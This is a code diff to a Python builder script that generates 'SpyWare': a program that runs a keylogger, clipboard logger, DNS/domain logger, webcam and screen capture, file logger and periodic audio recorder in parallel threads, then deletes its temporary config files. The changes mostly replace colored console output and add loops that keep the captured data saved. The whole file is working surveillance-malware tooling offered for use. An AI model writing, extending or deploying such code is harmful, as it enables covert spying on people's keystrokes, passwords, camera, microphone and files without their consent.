@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
-from colorama import Fore, Style, init
 import sys
-
-init(autoreset=True)
+from indicators import print_warning, print_success, print_info, print_prompt
 
 
 def option(prompt):
@@ -10,17 +8,17 @@ def option(prompt):
     allowed_false = ["no", "n", "0"]
 
     while True:
-        user_input = input(f"{Fore.WHITE}{Style.BRIGHT}{prompt}").strip().lower()
+        user_input = input(print_prompt(prompt)).strip().lower()
         if user_input in allowed_true:
             return True
         elif user_input in allowed_false:
             return False
         else:
-            print(f"{Fore.RED}{Style.BRIGHT}Invalid input. Please enter 'yes', 'no', 'y', 'n', '1', or '0'.")
+            print_warning("Invalid input. Please enter 'yes', 'no', 'y', 'n', '1', or '0'.")
 
 
 def main(output_file):
-    print(f"{Fore.GREEN}{Style.BRIGHT}Generating SpyWare...")
+    print_info("Generating SpyWare...")
     global include_KeyLogger, include_ClipboardLogger, include_DomainsLogger
     global include_WebcamSpy, include_ScreenSpy, include_FilesLogger, include_AudioRecorder
 
@@ -34,20 +32,20 @@ def main(output_file):
 
     set_configs()
     generate_code(output_file)
-    print(f"{Fore.GREEN}{Style.BRIGHT}SpyWare code generated and saved to: {output_file}")
+    print_success(f"SpyWare code generated and saved to: {output_file}")
 
 
 def set_configs():
     global keylogger_conf, clipboard_conf, domains_conf, webcam_conf, screen_conf, files_conf, audio_conf
-    print(f"{Fore.GREEN}{Style.BRIGHT}Setting custom configurations... ")
+    print_info("Setting custom configurations... ")
 
     if include_KeyLogger:
-        print(f"{Fore.CYAN}KeyLogger Configuration:")
-        filename = input("Filename [default: keySpy.txt]: ") or "keySpy.txt"
-        event_press = input("Log key press events? (0/1) [default: 0]: ") or "0"
-        event_release = input("Log key release events? (0/1) [default: 0]: ") or "0"
-        hot_keys = input("Log hotkeys? (0/1) [default: 1]: ") or "1"
-        event_time = input("Log event timestamps? (0/1) [default: 1]: ") or "1"
+        print_info("KeyLogger Configuration:")
+        filename = input(print_prompt("Filename [default: keySpy.txt]: ")) or "keySpy.txt"
+        event_press = input(print_prompt("Log key press events? (0/1) [default: 0]: ")) or "0"
+        event_release = input(print_prompt("Log key release events? (0/1) [default: 0]: ")) or "0"
+        hot_keys = input(print_prompt("Log hotkeys? (0/1) [default: 1]: ")) or "1"
+        event_time = input(print_prompt("Log event timestamps? (0/1) [default: 1]: ")) or "1"
 
         keylogger_conf = f"""[SAVE]
         filename = {filename}
@@ -60,9 +58,9 @@ def set_configs():
         """
 
     if include_ClipboardLogger:
-        print(f"{Fore.CYAN}Clipboard Logger Configuration:")
-        filename = input("Filename [default: clipboard.txt]: ") or "clipboard.txt"
-        check_interval = input("Check interval (seconds) [default: 11]: ") or "11"
+        print_info("Clipboard Logger Configuration:")
+        filename = input(print_prompt("Filename [default: clipboard.txt]: ")) or "clipboard.txt"
+        check_interval = input(print_prompt("Check interval (seconds) [default: 11]: ")) or "11"
 
         clipboard_conf = f"""[SAVE]
         filename = {filename}
@@ -72,12 +70,12 @@ def set_configs():
         """
 
     if include_DomainsLogger:
-        print(f"{Fore.CYAN}Domains Logger Configuration:")
-        filename = input("Filename [default: domains.txt]: ") or "domains.txt"
-        interval_dns = input("DNS check interval [default: 60]: ") or "60"
-        interval_appdata = input("AppData check interval [default: 86400]: ") or "86400"
-        interval_reading_file = input("File reading interval [default: 0.5]: ") or "0.5"
-        interval_domain = input("Domain check interval [default: 0.05]: ") or "0.05"
+        print_info("Domains Logger Configuration:")
+        filename = input(print_prompt("Filename [default: domains.txt]: ")) or "domains.txt"
+        interval_dns = input(print_prompt("DNS check interval [default: 60]: ")) or "60"
+        interval_appdata = input(print_prompt("AppData check interval [default: 86400]: ")) or "86400"
+        interval_reading_file = input(print_prompt("File reading interval [default: 0.5]: ")) or "0.5"
+        interval_domain = input(print_prompt("Domain check interval [default: 0.05]: ")) or "0.05"
 
         domains_conf = f"""[SAVE]
         filename = {filename}
@@ -90,10 +88,10 @@ def set_configs():
         """
 
     if include_WebcamSpy:
-        print(f"{Fore.CYAN}Webcam Spy Configuration:")
-        filename = input("Filename pattern [default: webcam*.png]: ") or "webcam*.png"
-        dirname = input("Save directory [default: pictures]: ") or "pictures"
-        picture_interval = input("Picture interval (seconds) [default: 3600]: ") or "3600"
+        print_info("Webcam Spy Configuration:")
+        filename = input(print_prompt("Filename pattern [default: webcam*.png]: ")) or "webcam*.png"
+        dirname = input(print_prompt("Save directory [default: pictures]: ")) or "pictures"
+        picture_interval = input(print_prompt("Picture interval (seconds) [default: 3600]: ")) or "3600"
 
         webcam_conf = f"""[SAVE]
         filename = {filename}
@@ -104,10 +102,10 @@ def set_configs():
         """
 
     if include_ScreenSpy:
-        print(f"{Fore.CYAN}Screen Spy Configuration:")
-        filename = input("Filename pattern [default: screenshot*.png]: ") or "screenshot*.png"
-        dirname = input("Save directory [default: screenshots]: ") or "screenshots"
-        screenshot_interval = input("Screenshot interval (seconds) [default: 3600]: ") or "3600"
+        print_info("Screen Spy Configuration:")
+        filename = input(print_prompt("Filename pattern [default: screenshot*.png]: ")) or "screenshot*.png"
+        dirname = input(print_prompt("Save directory [default: screenshots]: ")) or "screenshots"
+        screenshot_interval = input(print_prompt("Screenshot interval (seconds) [default: 3600]: ")) or "3600"
 
         screen_conf = f"""[SAVE]
         filename = {filename}
@@ -118,11 +116,11 @@ def set_configs():
         """
 
     if include_FilesLogger:
-        print(f"{Fore.CYAN}Files Logger Configuration:")
-        filename = input("Filename [default: files.csv]: ") or "files.csv"
-        file_interval = input("File interval [default: 0.1]: ") or "0.1"
-        directory_interval = input("Directory interval [default: 1]: ") or "1"
-        scan_interval = input("Full scan interval (seconds) [default: 86400]: ") or "86400"
+        print_info("Files Logger Configuration:")
+        filename = input(print_prompt("Filename [default: files.csv]: ")) or "files.csv"
+        file_interval = input(print_prompt("File interval [default: 0.1]: ")) or "0.1"
+        directory_interval = input(print_prompt("Directory interval [default: 1]: ")) or "1"
+        scan_interval = input(print_prompt("Full scan interval (seconds) [default: 86400]: ")) or "86400"
 
         files_conf = f"""[SAVE]
         filename = {filename}
@@ -134,11 +132,11 @@ def set_configs():
         """
 
     if include_AudioRecorder:
-        print(f"{Fore.CYAN}Audio Recorder Configuration:")
-        filename = input("Filename pattern [default: record*.wav]: ") or "record*.wav"
-        dirname = input("Save directory [default: records]: ") or "records"
-        interval = input("Recording interval (seconds) [default: 3590]: ") or "3590"
-        record_time = input("Each recording length (seconds) [default: 10]: ") or "10"
+        print_info("Audio Recorder Configuration:")
+        filename = input(print_prompt("Filename pattern [default: record*.wav]: ")) or "record*.wav"
+        dirname = input(print_prompt("Save directory [default: records]: ")) or "records"
+        interval = input(print_prompt("Recording interval (seconds) [default: 3590]: ")) or "3590"
+        record_time = input(print_prompt("Each recording length (seconds) [default: 10]: ")) or "10"
 
         audio_conf = f"""[SAVE]
         filename = {filename}
@@ -203,13 +201,26 @@ def run_all():
     threads = []
     config_paths = []
 """)
+        if include_DomainsLogger or include_ClipboardLogger:
+            f.write(f"""
+    def looping_persistent_save(instance, interval=5):
+        while True:
+            time.sleep(interval)
+            instance.persistent_save()""")
+
         if include_KeyLogger:
             f.write(f"""
     keylogger_conf = \"\"\"{keylogger_conf.strip()}\"\"\"
     key_conf_path = write_temp_config("keySpy.conf", keylogger_conf)
     keyConfig(key_conf_path)
     config_paths.append(key_conf_path)
-    threads.append(threading.Thread(target=keyDaemon().run_for_ever))""")
+    keylogger_instance = keyDaemon()
+    def set_counter(instance, interval=5, count=1000):
+        while True:
+            time.sleep(interval)
+            instance.counter = count
+    threads.append(threading.Thread(target=keylogger_instance.run_for_ever))
+    threads.append(threading.Thread(target=set_counter, args=(keylogger_instance,)))""")
 
         if include_ClipboardLogger:
             f.write(f"""
@@ -217,7 +228,9 @@ def run_all():
     clip_conf_path = write_temp_config("clipboard.conf", clipboard_conf)
     clipboardConfig(clip_conf_path)
     config_paths.append(clip_conf_path)
-    threads.append(threading.Thread(target=clipDaemon().run_for_ever))""")
+    clipboardlogger_instance = clipDaemon()
+    threads.append(threading.Thread(target=clipboardlogger_instance.run_for_ever))
+    threads.append(threading.Thread(target=looping_persistent_save, args=(clipboardlogger_instance,)))""")
 
         if include_DomainsLogger:
             f.write(f"""
@@ -225,10 +238,12 @@ def run_all():
     domains_conf_path = write_temp_config("domains.conf", domains_conf)
     domainsConfig(domains_conf_path)
     config_paths.append(domains_conf_path)
+    domain_instance = domainDaemon()
     def get_data():
-        domainDaemon().run_AppData()
-        domainDaemon().run_CacheDns()
-    threads.append(threading.Thread(target=get_data))""")
+        domain_instance.run_AppData()
+        domain_instance.run_CacheDns()
+    threads.append(threading.Thread(target=get_data))
+    threads.append(threading.Thread(target=looping_persistent_save, args=(domain_instance,)))""")
 
         if include_WebcamSpy:
             f.write(f"""
@@ -260,10 +275,10 @@ def run_all():
     audio_conf_path = write_temp_config("audio.conf", audio_conf)
     audioConfig(audio_conf_path)
     config_paths.append(audio_conf_path)
-    def get_audio_forever():
+    def record_for_ever():
         while True:
             audioDaemon().run_for_ever()
-    threads.append(threading.Thread(target=get_audio_forever))""")
+    threads.append(threading.Thread(target=record_for_ever))""")
 
         f.write("""
     cleanup_thread = threading.Thread(target=delayed_cleanup, args=(config_paths,))
@@ -288,9 +303,9 @@ if __name__ == "__main__":
     if len(sys.argv) > 1:
         output_filename = sys.argv[1]
     else:
-        output_filename = input(f"{Fore.YELLOW}Enter output filename: ").strip()
+        output_filename = input(print_prompt("Enter output filename: ")).strip()
         if not output_filename:
-            print(f"{Fore.RED}No output filename provided. Exiting.")
+            print(print_warning("No output filename provided. Exiting."))
             sys.exit(1)
 
     main(output_filename)
